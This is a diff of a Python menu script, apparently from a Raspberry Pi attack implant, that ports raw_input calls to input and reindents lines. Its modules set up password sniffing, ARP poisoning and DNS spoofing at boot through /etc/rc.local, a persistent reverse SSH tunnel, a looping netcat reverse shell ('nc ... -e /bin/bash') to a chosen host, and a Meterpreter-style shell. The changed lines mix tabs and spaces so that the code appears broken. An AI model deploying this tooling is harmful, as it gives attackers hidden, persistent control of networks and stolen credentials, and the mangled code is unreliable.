@@ -5,22 +5,22 @@ class choice:
         print("Starting Module:")
 
     def pas(self):
-	temp = open("/etc/rc.local", "r").read()
+        temp = open("/etc/rc.local", "r").read()
         temp = temp.replace("exit 0", "sudo python /home/pi/Int3rcept0r/pas/pas.py &\nexit 0")
-	open("/etc/rc.local", "w").write(temp)
+	    open("/etc/rc.local", "w").write(temp)
         print("\nPassword_Sniffing Completed\n")
 
     def arp(self):
-	temp = open("/etc/rc.local", "r").read()
+	    temp = open("/etc/rc.local", "r").read()
         temp = temp.replace("exit 0", "sudo python /home/pi/Int3rcept0r/arp/arp.py &\nexit 0")
-	open("/etc/rc.local", "w").write(temp)
-	print("\nARP_Poisoning Completed\n")
+	    open("/etc/rc.local", "w").write(temp)
+	    print("\nARP_Poisoning Completed\n")
 
     def dns(self):
         open("/etc/dnsmasq.conf", "w").write(open("default_files/etc/dnsmasq.conf", "r").read())
         open("/etc/hosts", "w").write(open("dns/hosts", "r").read())
-	os.system("sudo service dnsmasq restart")
-	print("\nDNS_Spoofing Completed\n")
+	    os.system("sudo service dnsmasq restart")
+	    print("\nDNS_Spoofing Completed\n")
 
     def dns_dnsmasq(self):
         open("/etc/dnsmasq.conf", "w").write(open("dns/dnsmasq/dnsmasq.conf", "r").read())
@@ -29,11 +29,11 @@ class choice:
         print("\nDnsmasq_DNS_Spoofing Completed\n")
         
     def rev_ssh(self):
-	ip = raw_input("Destination IP: ")
-        vps_port = raw_input("VPS Port (leave blank for default => 22): ")
+	    ip = input("Destination IP: ")
+        vps_port = input("VPS Port (leave blank for default => 22): ")
         if vps_port == "":
             vps_port = 22
-        tunnel_port = raw_input("Tunnel Port (leave blank for default => 4444): ")
+        tunnel_port = input("Tunnel Port (leave blank for default => 4444): ")
         if tunnel_port == "":
             tunnel_port = 4444
         com = 'autossh -M 10387 -N -f -o "PubkeyAuthentication=yes" -o "PasswordAuthentication=no" -i /home/pi/.ssh/id_rsa -R %s:localhost:22 restricted_user@%s -p %s &' % (tunnel_port,ip,vps_port)
@@ -43,8 +43,8 @@ class choice:
 	print("\nReverse_SSH Completed\n")
 
     def rev_net(self):
-        ip = raw_input("Destination IP: ")
-        port = raw_input("Port: ")
+        ip = input("Destination IP: ")
+        port = input("Port: ")
         com = 'while [ 1 ]; do nc %s %s -e /bin/bash; sleep 30; done'% (ip,port)
         open("rev_net/nc.sh", "w").write(com)
         temp = open("/etc/rc.local", "r").read()
@@ -53,8 +53,8 @@ class choice:
 	print("\nReverse_Netcat_Shell Completed\n")
 
     def rev_met(self):
-	ip = raw_input("Destination IP: ")
-        port = raw_input("Port: ")
+	ip = input("Destination IP: ")
+        port = input("Port: ")
         temp = open("met/default/shell.py","r").read()
         temp = temp.replace("host", ip).replace("l_port", port)
         open("met/shell.py", "w").write(temp)
@@ -81,7 +81,7 @@ class choice:
 	os.system('sudo sh -c "echo 1 > /proc/sys/net/ipv4/ip_forward"')
 	print("\nReset Completed\n")
 
-meth = int(raw_input("""Please select which module to run
+meth = int(input("""Please select which module to run
 
 0 => Password Sniffing
 
@@ -106,14 +106,14 @@ if meth < 0 or meth > 8:
 	print("Not a valid option!\n")
 else:
 	c = choice()
-        options = {0:c.pas,
-                   1:c.arp,
-                   2:c.dns,
-                   3:c.dns_dnsmasq,
-                   4:c.rev_ssh,
-                   5:c.rev_net,
-                   6:c.rev_met,
-                   7:c.power_only,
-                   8:c.rst}
-        options[meth]()
+    options = {0:c.pas,
+               1:c.arp,
+               2:c.dns,
+               3:c.dns_dnsmasq,
+               4:c.rev_ssh,
+               5:c.rev_net,
+               6:c.rev_met,
+               7:c.power_only,
+               8:c.rst}
+    options[meth]()
 
